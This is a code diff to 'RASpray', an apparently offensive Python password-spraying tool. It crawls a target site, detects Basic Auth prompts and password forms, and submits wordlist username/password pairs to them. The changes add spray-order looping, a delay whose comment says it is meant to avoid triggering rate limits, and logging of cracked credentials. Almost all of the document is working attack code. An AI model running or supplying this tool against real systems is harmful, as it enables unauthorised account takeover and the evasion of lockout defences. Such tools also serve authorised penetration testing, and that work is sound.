@@ -8,6 +8,7 @@ from requests.auth import HTTPBasicAuth
 from requests.exceptions import RequestException, Timeout, ConnectionError
 from urllib.parse import urljoin
 from colorama import Fore, Style, init
+import time
 
 # Define the tool's name and version
 TOOL_NAME = "RASpray"
@@ -106,10 +107,9 @@ def traverse_website(base_url, session, max_depth=3):
     
     return links
 
-# Function to check if a page prompts BasicAuth
 def is_password_requested_basic_auth(url, session):
     """
-    Checks if the given page contains requests Basic Authentication.
+    Checks if the given page requires HTTP Basic Authentication.
 
     Args:
         url (str): The URL of the page to check.
@@ -119,24 +119,23 @@ def is_password_requested_basic_auth(url, session):
         bool: True if the page prompts for Basic Authentication, False otherwise.
     """
     try:
-        # Send a HEAD request first to avoid downloading the entire page if it's protected by BasicAuth
-        response = session.head(url, timeout=10)
+        # Send a GET request to check if BasicAuth is required
+        response = session.get(url, timeout=10, allow_redirects=False)
 
-        # Check if BasicAuth is requested (401 Unauthorized)
+        # Check if the response is a 401 Unauthorized indicating BasicAuth is needed
         if response.status_code == 401:
-            print(f"BasicAuth requested on {url}")
+            print(f"BasicAuth required on {url}")
             return True
-    
         else:
-            print(f"No password field on {url}")
+            print(f"No BasicAuth required on {url}")
             return False
 
     except RequestException as e:
         print(f"Error checking {url}: {e}")
         return False
+
     
     
-# Function to check if a page contains a password field uth
 def is_password_requested_basic_password_field(url, session):
     """
     Checks if the given page contains an input field for a password.
@@ -149,18 +148,15 @@ def is_password_requested_basic_password_field(url, session):
         bool: True if the page contains a password field, False otherwise.
     """
     try:
-        # Send a HEAD request first to avoid downloading the entire page if it's protected by BasicAuth
-        response = session.head(url, timeout=10)
-
-        # Make a GET request and parse the HTML to check for password fields
         response = session.get(url, timeout=10)
         soup = BeautifulSoup(response.text, 'html.parser')
-        
-        # Parse HTML to look for password fields
+
+        # Parse HTML to look for password fields more robustly
         password_fields = soup.find_all('input', {'type': 'password'})
-        
-        if password_fields:
-            print(f"Password field found on {url}")
+
+        # Also check for any form that looks like a login form
+        if password_fields or is_login_form_present(response.text):
+            print(f"{Fore.GREEN}Password field found on {url}")
             return True
         else:
             print(f"No password field on {url}")
@@ -169,6 +165,7 @@ def is_password_requested_basic_password_field(url, session):
     except RequestException as e:
         print(f"Error checking {url}: {e}")
         return False
+
 
 
 # Function to filter usernames or passwords based on user criteria
@@ -237,40 +234,54 @@ def extract_form_fields(soup):
 
 def attempt_login_with_form(full_url, session, username, password):
     """
-    Attempts to login by submitting the form with the username and password,
-    and returns the credentials for Basic Auth if a redirect occurs.
+    Attempts to login by submitting the form with the username and password.
+    
+    Args:
+        full_url (str): The URL to submit the form to.
+        session (Session): The session object to maintain cookies across requests.
+        username (str): The username to attempt.
+        password (str): The password to attempt.
+    
+    Returns:
+        tuple or None: Returns a tuple of (username, password) if successful, otherwise None.
     """
     try:
         # Load the login page to retrieve form fields
         response = session.get(full_url)
         soup = BeautifulSoup(response.text, 'html.parser')
 
-        # Extract the form fields
+        # Extract the form fields and update with credentials
         form_data = extract_form_fields(soup)
-
-        # Update the form fields with the username and password
         form_data['username'] = username
         form_data['password'] = password
 
-        # Submit the form data via POST
-        login_response = session.post(full_url, data=form_data, allow_redirects=False)
-        
-        # Check if the response indicates a redirect (302)
-        if login_response.status_code == 302:
-            # Extract the redirection URL (if it contains credentials for Basic Auth)
-            redirect_url = login_response.headers.get('Location', '')
-            
-            # If the redirect URL contains a user/pass (Basic Auth format), return those credentials
-            if '@' in redirect_url:
-                auth_part = redirect_url.split('@')[0].replace('http://', '')
-                return auth_part.split(':')
+        # Extract form action URL (relative or absolute)
+        form = soup.find('form')
+        action_url = form.get('action') if form else full_url
+        action_url = urljoin(full_url, action_url)
+        print(f"{Fore.WHITE}Submitting form to {action_url} with {username}:{password}")
 
+        # Submit the form data via POST
+        login_response = session.post(action_url, data=form_data, allow_redirects=False)
+
+        # Check if the response indicates a redirect (302/303)
+        if login_response.status_code in [302, 303]:
+            print(f"{Fore.GREEN}Redirect detected after login attempt, likely successful. Redirect URL: {login_response.headers.get('Location', '')}")
+            return (username, password)
+        
+        # Check for specific keywords indicating successful login in the response content
+        if "welcome" in login_response.text.lower() or "logout" in login_response.text.lower():
+            print(f"{Fore.GREEN}Login successful for {username} on {full_url}")
+            return (username, password)
+        
+        # Print the reason why the login might have failed (snippet of the error)
+        failure_reason = extract_failure_reason(login_response.text)
+        print(f"{Fore.RED}Login failed for {username} on {full_url}. Reason: {failure_reason}")
         return None
 
     except (RequestException, Timeout, ConnectionError) as e:
         print(f"Error during login attempt on {full_url}: {e}")
         return None
-
 
 
 
@@ -311,42 +322,44 @@ def password_spraying(ip_address, username_file, password_file, criteria):
 
         # Check if the page has a password field (form-based authentication)
         if is_password_requested_basic_password_field(full_url, session):
-            for username in usernames:
-                for password in passwords:
+            for password in passwords:
+                for username in usernames:
+                    
                     try:
                         # Attempt to login by simulating form submission
+                        print(f"{Fore.WHITE}Trying username: {username} and password: {password}")
                         credentials = attempt_login_with_form(full_url, session, username, password)
-                        
-                        # If login redirected to a Basic Auth page, retry with those credentials
-                        if credentials:
-                            auth_response = session.get(full_url, auth=HTTPBasicAuth(credentials[0], credentials[1]))
 
-                            if auth_response.status_code == 200:
-                                print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
-                                successful_cracks.append((full_url, credentials[0], credentials[1]))
-                            else:
-                                print(f"{Fore.RED}Failed BasicAuth for Username: {credentials[0]} on {full_url}")
-                                failed_cracks.append(full_url)
+                        # Check if the login was successful based on the result
+                        if credentials:
+                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
+                            successful_cracks.append((full_url, credentials[0], credentials[1]))
+                        else:
+                            print(f"{Fore.RED}Failed login attempt for {username} on {full_url}.")
+                            failed_cracks.append((full_url, username, password))
+                        # Sleep for 0.5 second between attempts to avoid triggering rate limits
+                        time.sleep(0.5)
                     except (Timeout, ConnectionError):
                         print(f"Connection failed for {full_url}")
                     except RequestException as e:
                         print(f"An error occurred: {e}")
-    
+
     # Summary of cracking attempts
     print("\n--- Summary of Cracking Attempts ---")
     if successful_cracks:
         print(f"{Fore.GREEN}Successfully cracked pages:")
         for page, user, pwd in successful_cracks:
-            print(f"Page: {page}, Username: {user}, Password: {pwd}")
+            print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
     else:
         print(f"{Fore.RED}No successful cracking attempts.")
     
     if failed_cracks:
         print(f"{Fore.RED}Failed pages that required a password:")
-        for page in failed_cracks:
-            print(f"Page: {page}")
+        for page, user, pwd in failed_cracks:
+            print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
     else:
         print(f"{Fore.GREEN}No failed password cracking attempts.")
+
 
 
 # Helper function to check if the response contains a login form
@@ -366,6 +379,30 @@ def is_login_form_present(html_content):
     
     # If both username and password fields are found, it's likely a login form
     return username_field is not None and password_field is not None
+
+def extract_failure_reason(html_content):
+    """
+    Extracts potential failure reasons from the login response content.
+    
+    Args:
+        html_content (str): The HTML content to parse.
+
+    Returns:
+        str: A snippet of the content indicating the reason for the login failure.
+    """
+    soup = BeautifulSoup(html_content, 'html.parser')
+    
+    # Look for common elements that might contain error messages
+    error_messages = soup.find_all(['div', 'span', 'p', 'li'], class_=re.compile(r'error|alert|warning|message', re.I))
+    error_texts = [msg.get_text(strip=True) for msg in error_messages if msg.get_text(strip=True)]
+    
+    # If no specific error messages are found, provide a fallback snippet from the page
+    if not error_texts:
+        return soup.get_text(strip=True)[:200]  # Return the first 200 characters of the page content as a fallback
+    
+    # Join the extracted error messages into a single string
+    return ' | '.join(error_texts)
+
 
 
 # Main function
